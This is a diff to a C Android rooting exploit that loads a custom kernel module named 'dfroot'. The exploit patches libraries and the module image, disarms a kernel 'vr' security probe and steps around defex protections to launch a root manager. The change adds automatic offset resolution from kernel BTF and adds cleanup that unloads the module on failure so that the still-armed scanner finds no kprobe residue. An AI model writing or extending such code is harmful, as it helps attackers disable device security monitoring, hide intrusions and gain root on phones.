@@ -26,6 +26,7 @@ static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
 static unsigned long long g_vr_off;   /* W1c funcs offset, 0 = stage off */
+static int g_vr_auto;                 /* W1c auto-resolve: ko derives offset from BTF */
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -364,16 +365,18 @@ static int patch_ko(void) {
      * the user-supplied funcs offset right after it (df_vr_cfg[1]). The
      * magic sits in a global volatile array, so its image offset is stable
      * regardless of where the loader maps the module. */
-    if (g_vr_off) {
+    if (g_vr_off || g_vr_auto) {
         static const unsigned char magic[8] =
             { 0x16, 0xFF, 0xC0, 0xDF, 0x16, 0xFF, 0xC0, 0xDF };
         int done = 0;
-        for (size_t i = 0; i + 16 <= len && !done; i++) {
+        for (size_t i = 0; i + 24 <= len && !done; i++) {
             if (memcmp(buf + i, magic, 8) == 0) {
-                unsigned long long v = g_vr_off;
-                memcpy(buf + i + 8, &v, 8);
-                printf("vr: cfg patched, funcs offset %llu (slot @%#zx)\n",
-                       g_vr_off, i);
+                unsigned long long v = g_vr_auto ? 0 : g_vr_off;
+                unsigned long long m = g_vr_auto ? 1 : 0;
+                memcpy(buf + i + 8, &v, 8);   /* cfg[1]: funcs offset */
+                memcpy(buf + i + 16, &m, 8);  /* cfg[2]: auto mode */
+                printf("vr: cfg patched (%s)\n",
+                       g_vr_auto ? "auto-resolve" : "funcs offset provided");
                 done = 1;
             }
         }
@@ -521,6 +524,8 @@ static int setup(int argc, char **argv) {
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
         else if (!strcmp(a, "--vr-off") && i + 1 < argc)
             g_vr_off = strtoull(argv[++i], NULL, 0);  /* dec or 0x hex */
+        else if (!strcmp(a, "--vr-auto"))
+            g_vr_auto = 1;
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -542,7 +547,9 @@ static int setup(int argc, char **argv) {
     printf("found ko_target: %s\n", ko_target);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
-    if (g_vr_off)
+    if (g_vr_auto)
+        printf("vr funcs offset: auto-resolve (kernel BTF)\n");
+    else if (g_vr_off)
         printf("vr funcs offset: %llu\n", g_vr_off);
     return 0;
 }
@@ -572,7 +579,9 @@ static int exploit(void) {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfvr0", "vr: sys_exit probe disarmed (funcs = NULL)",       -1 },
-        { "/dev/dfvre", "vr: W1c FAILED - tracepoint/offset mismatch, vr intact", -1 },
+        { "/dev/dfvre", "vr: ERROR - disarm failed, aborting before manager",      4 },
+        { "/dev/dfvra", "vr: auto-resolve ok",                                     -1 },
+        { "/dev/dfvrx", "vr: ERROR - auto-resolve failed, aborting before manager", 4 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
@@ -600,6 +609,13 @@ static int exploit(void) {
     printf("timeout: ERROR - check logcat & dmesg\n");
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+    if (rc == 4) {
+        /* W1c refused: bootstrap was renamed away, manager never launched.
+         * Unload the ko so no kprobe/defex residue faces the still-armed
+         * vr scanner; the app locks re-runs until reboot as usual. */
+        printf("vr: ERROR - root chain aborted (vr intact), unloading dfroot\n");
+        syscall(__NR_delete_module, "dfroot", O_NONBLOCK);
+    }
     return rc;
 }
 
